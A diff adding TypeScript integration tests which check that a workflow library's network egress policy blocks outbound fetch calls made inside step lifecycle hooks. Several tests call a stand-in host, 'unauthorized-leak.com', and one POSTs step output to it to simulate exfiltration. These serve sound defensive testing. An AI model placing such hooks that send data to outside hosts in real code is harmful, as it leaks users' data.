@@ -250,6 +250,107 @@ describe('Network Egress Policy End-to-End Integration Suite', () => {
         });
     });
 
+    describe('Step Lifecycle Hooks Network Governance', () => {
+        it('intercepts and blocks unauthorized network egress inside onBefore hook', async () => {
+            const stepWithBeforeLeak = Step.create('beforeLeakStep', () => ({ ok: true }))
+                .denyNetwork()
+                .onBefore(async () => {
+                    await fetch('https://unauthorized-leak.com/pre-check');
+                    return true;
+                });
+
+            try {
+                await stepWithBeforeLeak.execute();
+                expect.fail('Should have intercepted unauthorized egress in onBefore');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.stepName).to.equal('beforeLeakStep');
+                expect(err.requestedHost).to.equal('unauthorized-leak.com');
+                expect(err.phase).to.equal('before');
+            }
+        });
+
+        it('intercepts and blocks unauthorized network egress inside onSkip hook', async () => {
+            const stepWithSkipLeak = Step.create('skipLeakStep', () => ({ ok: true }))
+                .denyNetwork()
+                .onBefore(() => false)
+                .onSkip(async () => {
+                    await fetch('https://unauthorized-leak.com/skip-fallback');
+                    return { skipped: true };
+                });
+
+            try {
+                await stepWithSkipLeak.execute();
+                expect.fail('Should have intercepted unauthorized egress in onSkip');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.stepName).to.equal('skipLeakStep');
+                expect(err.requestedHost).to.equal('unauthorized-leak.com');
+            }
+        });
+
+        it('intercepts and blocks unauthorized network egress inside onAfter hook', async () => {
+            const stepWithAfterLeak = Step.create('afterLeakStep', () => ({ computed: 42 }))
+                .denyNetwork()
+                .onAfter(async (output) => {
+                    await fetch('https://unauthorized-leak.com/enrich', {
+                        method: 'POST',
+                        body: JSON.stringify(output)
+                    });
+                    return output;
+                });
+
+            try {
+                await stepWithAfterLeak.execute();
+                expect.fail('Should have intercepted unauthorized egress in onAfter');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.stepName).to.equal('afterLeakStep');
+                expect(err.requestedHost).to.equal('unauthorized-leak.com');
+                expect(err.phase).to.equal('after');
+            }
+        });
+
+        it('intercepts and blocks unauthorized network egress inside onFail hook', async () => {
+            const stepWithFailLeak = Step.create('failLeakStep', () => {
+                throw new Error('Action failed');
+            })
+            .denyNetwork()
+            .onFail(async (_err, retry) => {
+                await fetch('https://unauthorized-leak.com/fail-webhook');
+                retry({ recovered: true });
+            });
+
+            try {
+                await stepWithFailLeak.execute();
+                expect.fail('Should have intercepted unauthorized egress in onFail');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.stepName).to.equal('failLeakStep');
+                expect(err.requestedHost).to.equal('unauthorized-leak.com');
+            }
+        });
+
+        it('allows permitted network calls across onBefore and onAfter hooks', async () => {
+            const permittedStep = Step.create('permittedLifecycleStep', () => ({ processed: true }))
+                .allowNetwork(['127.0.0.1'])
+                .onBefore(async () => {
+                    const res = await fetch(`http://127.0.0.1:${localPort}/`);
+                    const data = await res.json();
+                    return data.status === 'ok';
+                })
+                .onAfter(async (output) => {
+                    const res = await fetch(`http://127.0.0.1:${localPort}/`);
+                    const data = await res.json();
+                    return { ...output, service: data.service };
+                });
+
+            const result: any = await permittedStep.execute();
+            expect(result.processed).to.be.true;
+            expect(result.service).to.equal('mock-local-api');
+        });
+    });
+
     describe('Graph Inspection Integration', () => {
         it('includes step and flow networkPolicy in toGraph and inspectGraph', () => {
             const stepA = Step.create('stepA', () => ({})).allowNetwork(['api.stripe.com']);
